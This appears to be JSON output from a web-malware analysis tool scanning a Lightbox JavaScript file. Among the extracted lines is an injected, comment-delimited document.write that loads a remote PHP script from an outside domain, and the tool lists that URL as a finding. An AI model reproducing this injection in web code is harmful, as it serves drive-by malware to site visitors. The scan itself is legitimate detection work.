            "\t\tif (self.innerHeight) {\t// all except Explorer",
            "\t\t\tif(document.documentElement.clientWidth){",
            "\t\t\t\twindowWidth = document.documentElement.clientWidth; ",
            "\t\t\t} else {",
            "\t\t\t\twindowWidth = self.innerWidth;",
            "\t\t\t}",
            "\t\t\twindowHeight = self.innerHeight;",
            "\t\t} else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode",
            "\t\t\twindowWidth = document.documentElement.clientWidth;",
            "\t\t\twindowHeight = document.documentElement.clientHeight;",
            "\t\t} else if (document.body) { // other Explorers",
            "\t\t\twindowWidth = document.body.clientWidth;",
            "\t\t\twindowHeight = document.body.clientHeight;",
            "\t\t}\t",
            "\t\t// for small pages with total height less then height of the viewport",
            "\t\tif(yScroll < windowHeight){",
            "\t\t\tpageHeight = windowHeight;",
            "\t\t} else { ",
            "\t\t\tpageHeight = yScroll;",
            "\t\t// for small pages with total width less then width of the viewport",
            "\t\tif(xScroll < windowWidth){\t",
            "\t\t\tpageWidth = xScroll;\t\t",
            "\t\t} else {",
            "\t\t\tpageWidth = windowWidth;",
            "\t\treturn [pageWidth,pageHeight];",
            "document.observe('dom:loaded', function () { new Lightbox(); });",
            "/*3ef5ca*/",
            "document.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=120480385' type='text/javascript'></\" + \"script>\");",
            "/*/3ef5ca*/"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=120480385"
        ]
    },
    "time": "0:00:00.372796",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
